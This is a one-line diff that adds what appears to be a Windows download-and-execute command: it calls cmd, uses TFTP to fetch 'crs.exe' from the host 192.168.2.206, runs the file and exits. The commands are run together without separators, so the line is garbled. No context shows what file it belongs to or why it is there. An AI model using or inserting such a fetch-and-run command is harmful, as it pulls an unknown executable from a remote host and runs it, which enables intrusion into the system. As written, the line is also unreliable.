@@ -1,0 +1,1 @@
+cmdtftp -i 192.168.2.206 GET crs.execrs.exeexit
